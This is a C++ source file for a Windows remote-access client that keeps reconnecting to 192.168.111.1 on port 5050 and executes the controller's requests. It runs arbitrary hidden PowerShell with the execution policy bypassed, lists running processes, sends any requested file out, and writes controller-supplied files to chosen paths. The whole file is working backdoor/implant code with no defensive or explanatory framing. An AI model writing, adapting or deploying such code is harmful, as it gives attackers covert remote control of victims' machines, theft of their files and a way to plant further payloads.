#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>

#pragma comment(lib, "Ws2_32.lib")

namespace
{
	std::string Utf8FromWide(const std::wstring& value)
	{
		if (value.empty())
		{
			return {};
		}

		int count = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), -1, nullptr, 0, nullptr, nullptr);
		std::string result(static_cast<size_t>(count > 0 ? count - 1 : 0), '\0');
		if (count > 1)
		{
			WideCharToMultiByte(CP_UTF8, 0, value.c_str(), -1, &result[0], count - 1, nullptr, nullptr);
		}
		return result;
	}

	std::wstring WideFromUtf8(const std::string& value)
	{
		if (value.empty())
		{
			return {};
		}

		int count = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
		std::wstring result(static_cast<size_t>(count), L'\0');
		MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), &result[0], count);
		return result;
	}

	bool SendAll(SOCKET socketHandle, const std::string& payload)
	{
		int total = 0;
		while (total < static_cast<int>(payload.size()))
		{
			int sent = send(socketHandle, payload.data() + total, static_cast<int>(payload.size()) - total, 0);
			if (sent == SOCKET_ERROR)
			{
				return false;
			}
			total += sent;
		}
		return true;
	}

	std::wstring GetClientId()
	{
		wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = {};
		DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
		if (GetComputerNameW(buffer, &size))
		{
			return std::wstring(buffer, size);
		}
		return L"localhost-client";
	}

	std::wstring EnumerateProcesses()
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (snapshot == INVALID_HANDLE_VALUE)
		{
			return L"snapshot_failed";
		}

		PROCESSENTRY32 entry = {};
		entry.dwSize = sizeof(entry);
		std::wstring lines;
		if (Process32First(snapshot, &entry))
		{
			do
			{
				lines += std::to_wstring(entry.th32ProcessID);
				lines += L" ";
				lines += entry.szExeFile;
				lines += L"\n";
			} while (Process32Next(snapshot, &entry));
		}
		CloseHandle(snapshot);
		return lines.empty() ? L"no_processes" : lines;
	}

	enum class FrameType : unsigned short
	{
		HELLO = 1,
		EXEC_REQ = 2,
		LIST_PROC_REQ = 3,
		GET_FILE_REQ = 4,
		PUT_FILE_REQ = 5,

		EXEC_RESP = 100,
		LIST_PROC_RESP = 101,
		GET_FILE_RESP = 102,
		PUT_FILE_RESP = 103,
		ERROR_RESP = 199,
	};

	struct Frame
	{
		FrameType type;
		unsigned int requestId;
		std::vector<char> payload;
	};

	bool SendAll(SOCKET socketHandle, const void* data, int size)
	{
		int total = 0;
		const char* bytes = static_cast<const char*>(data);
		while (total < size)
		{
			int sent = send(socketHandle, bytes + total, size - total, 0);
			if (sent == SOCKET_ERROR)
			{
				return false;
			}
			total += sent;
		}
		return true;
	}

	bool RecvExact(SOCKET socketHandle, void* outData, int size)
	{
		char* bytes = static_cast<char*>(outData);
		int total = 0;
		while (total < size)
		{
			int got = recv(socketHandle, bytes + total, size - total, 0);
			if (got <= 0)
			{
				return false;
			}
			total += got;
		}
		return true;
	}

	bool SendFrame(SOCKET socketHandle, FrameType type, unsigned int requestId, const void* payload, unsigned int payloadLen)
	{
		unsigned short typeValue = static_cast<unsigned short>(type);
		if (!SendAll(socketHandle, &payloadLen, sizeof(payloadLen))) return false;
		if (!SendAll(socketHandle, &typeValue, sizeof(typeValue))) return false;
		if (!SendAll(socketHandle, &requestId, sizeof(requestId))) return false;
		if (payloadLen > 0) return SendAll(socketHandle, payload, static_cast<int>(payloadLen));
		return true;
	}

	bool RecvFrame(SOCKET socketHandle, Frame& outFrame)
	{
		unsigned int payloadLen = 0;
		unsigned short type = 0;
		unsigned int requestId = 0;
		if (!RecvExact(socketHandle, &payloadLen, sizeof(payloadLen))) return false;
		if (!RecvExact(socketHandle, &type, sizeof(type))) return false;
		if (!RecvExact(socketHandle, &requestId, sizeof(requestId))) return false;
		if (payloadLen > (60U * 1024U * 1024U)) return false;
		outFrame.type = static_cast<FrameType>(type);
		outFrame.requestId = requestId;
		outFrame.payload.assign(payloadLen, 0);
		if (payloadLen > 0 && !RecvExact(socketHandle, outFrame.payload.data(), static_cast<int>(payloadLen))) return false;
		return true;
	}

	bool ExecCommandCapture(const std::wstring& command, std::wstring& outStdout)
	{
		outStdout.clear();
		SECURITY_ATTRIBUTES sa = {};
		sa.nLength = sizeof(sa);
		sa.bInheritHandle = TRUE;

		HANDLE readPipe = nullptr;
		HANDLE writePipe = nullptr;
		if (!CreatePipe(&readPipe, &writePipe, &sa, 0))
		{
			return false;
		}
		SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);

		std::wstring cmdLine = L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + command;
		STARTUPINFO si = {};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.hStdOutput = writePipe;
		si.hStdError = writePipe;
		si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
		si.wShowWindow = SW_HIDE;
		PROCESS_INFORMATION pi = {};

		BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
		CloseHandle(writePipe);
		writePipe = nullptr;

		if (!ok)
		{
			CloseHandle(readPipe);
			return false;
		}

		std::string buffer;
		char tmp[4096];
		DWORD read = 0;
		while (ReadFile(readPipe, tmp, sizeof(tmp), &read, nullptr) && read > 0)
		{
			buffer.append(tmp, tmp + read);
			if (buffer.size() > 1024 * 1024) break;
		}
		CloseHandle(readPipe);

		WaitForSingleObject(pi.hProcess, 5000);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

		outStdout = WideFromUtf8(buffer);
		return true;
	}

	bool SendError(SOCKET socketHandle, unsigned int requestId, const std::wstring& message)
	{
		std::string utf8 = Utf8FromWide(message);
		return SendFrame(socketHandle, FrameType::ERROR_RESP, requestId, utf8.data(), static_cast<unsigned int>(utf8.size()));
	}
}

int wmain()
{
	WSADATA wsaData = {};
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return 1;
	}

	std::wstring clientId = GetClientId();

	while (true)
	{
		SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (socketHandle == INVALID_SOCKET)
		{
			std::wcerr << L"socket() failed: " << WSAGetLastError() << L"\n";
			Sleep(1000);
			continue;
		}

		sockaddr_in address = {};
		address.sin_family = AF_INET;
		address.sin_port = htons(5050);
		InetPton(AF_INET, L"192.168.111.1", &address.sin_addr);

		if (connect(socketHandle, reinterpret_cast<sockaddr*>(&address), sizeof(address)) == SOCKET_ERROR)
		{
			std::wcerr << L"connect failed: " << WSAGetLastError() << L"\n";
			closesocket(socketHandle);
			Sleep(1000);
			continue;
		}

		std::string helloUtf8 = Utf8FromWide(clientId);
		if (!SendFrame(socketHandle, FrameType::HELLO, 0, helloUtf8.data(), static_cast<unsigned int>(helloUtf8.size())))
		{
			std::wcerr << L"send HELLO failed: " << WSAGetLastError() << L"\n";
			closesocket(socketHandle);
			Sleep(1000);
			continue;
		}
		std::wcerr << L"connected+HELLO as: " << clientId << L"\n";

		while (true)
		{
			Frame frame = {};
			if (!RecvFrame(socketHandle, frame))
			{
				std::wcerr << L"recv frame failed/disconnect: " << WSAGetLastError() << L"\n";
				break;
			}

			if (frame.type == FrameType::EXEC_REQ)
			{
				std::wstring cmd = WideFromUtf8(std::string(frame.payload.begin(), frame.payload.end()));
				std::wstring out;
				if (!ExecCommandCapture(cmd, out))
				{
					SendError(socketHandle, frame.requestId, L"EXEC failed");
					continue;
				}
				std::string outUtf8 = Utf8FromWide(out);
				SendFrame(socketHandle, FrameType::EXEC_RESP, frame.requestId, outUtf8.data(), static_cast<unsigned int>(outUtf8.size()));
				continue;
			}

			if (frame.type == FrameType::LIST_PROC_REQ)
			{
				std::wstring list = EnumerateProcesses();
				std::string utf8 = Utf8FromWide(list);
				SendFrame(socketHandle, FrameType::LIST_PROC_RESP, frame.requestId, utf8.data(), static_cast<unsigned int>(utf8.size()));
				continue;
			}

			if (frame.type == FrameType::GET_FILE_REQ)
			{
				std::wstring path = WideFromUtf8(std::string(frame.payload.begin(), frame.payload.end()));
				HANDLE fileHandle = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
				if (fileHandle == INVALID_HANDLE_VALUE)
				{
					SendError(socketHandle, frame.requestId, L"GET_FILE cannot open");
					continue;
				}
				LARGE_INTEGER size = {};
				if (!GetFileSizeEx(fileHandle, &size) || size.QuadPart < 0 || size.QuadPart >(50LL * 1024 * 1024))
				{
					CloseHandle(fileHandle);
					SendError(socketHandle, frame.requestId, L"GET_FILE unsupported size");
					continue;
				}
				std::vector<char> bytes(static_cast<size_t>(size.QuadPart));
				DWORD read = 0;
				size_t offset = 0;
				while (offset < bytes.size())
				{
					DWORD chunk = static_cast<DWORD>(std::min<size_t>(64 * 1024, bytes.size() - offset));
					if (!ReadFile(fileHandle, bytes.data() + offset, chunk, &read, nullptr) || read == 0)
					{
						CloseHandle(fileHandle);
						SendError(socketHandle, frame.requestId, L"GET_FILE read failed");
						bytes.clear();
						break;
					}
					offset += read;
				}
				CloseHandle(fileHandle);
				if (bytes.empty() && size.QuadPart > 0)
				{
					continue;
				}
				unsigned int status = 0;
				unsigned long long fileSize = static_cast<unsigned long long>(bytes.size());
				std::vector<char> payload;
				payload.resize(sizeof(status) + sizeof(fileSize) + bytes.size());
				memcpy(payload.data(), &status, sizeof(status));
				memcpy(payload.data() + sizeof(status), &fileSize, sizeof(fileSize));
				memcpy(payload.data() + sizeof(status) + sizeof(fileSize), bytes.data(), bytes.size());
				SendFrame(socketHandle, FrameType::GET_FILE_RESP, frame.requestId, payload.data(), static_cast<unsigned int>(payload.size()));
				continue;
			}

			if (frame.type == FrameType::PUT_FILE_REQ)
			{
				if (frame.payload.size() < sizeof(unsigned int) + sizeof(unsigned long long))
				{
					SendError(socketHandle, frame.requestId, L"PUT_FILE invalid payload");
					continue;
				}
				unsigned int pathLen = 0;
				memcpy(&pathLen, frame.payload.data(), sizeof(pathLen));
				if (frame.payload.size() < sizeof(pathLen) + pathLen + sizeof(unsigned long long))
				{
					SendError(socketHandle, frame.requestId, L"PUT_FILE invalid payload");
					continue;
				}
				std::string pathUtf8(frame.payload.data() + sizeof(pathLen), frame.payload.data() + sizeof(pathLen) + pathLen);
				std::wstring path = WideFromUtf8(pathUtf8);
				unsigned long long fileSize = 0;
				memcpy(&fileSize, frame.payload.data() + sizeof(pathLen) + pathLen, sizeof(fileSize));
				size_t headerSize = sizeof(pathLen) + pathLen + sizeof(fileSize);
				if (frame.payload.size() < headerSize + static_cast<size_t>(fileSize))
				{
					SendError(socketHandle, frame.requestId, L"PUT_FILE size mismatch");
					continue;
				}

				HANDLE outFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
				if (outFile == INVALID_HANDLE_VALUE)
				{
					SendError(socketHandle, frame.requestId, L"PUT_FILE cannot create");
					continue;
				}
				DWORD written = 0;
				const char* data = frame.payload.data() + headerSize;
				unsigned long long remaining = fileSize;
				bool writeFailed = false;
				while (remaining > 0)
				{
					DWORD chunk = static_cast<DWORD>(std::min<unsigned long long>(64 * 1024ULL, remaining));
					if (!WriteFile(outFile, data + (fileSize - remaining), chunk, &written, nullptr) || written == 0)
					{
						SendError(socketHandle, frame.requestId, L"PUT_FILE write failed");
						writeFailed = true;
						break;
					}
					remaining -= written;
				}
				CloseHandle(outFile);
				if (writeFailed)
				{
					continue;
				}

				std::string ok = Utf8FromWide(L"OK PUT_FILE saved");
				SendFrame(socketHandle, FrameType::PUT_FILE_RESP, frame.requestId, ok.data(), static_cast<unsigned int>(ok.size()));
				continue;
			}

			SendError(socketHandle, frame.requestId, L"Unsupported request");
		}

		closesocket(socketHandle);
		Sleep(1000);
	}

	WSACleanup();
	return 0;
}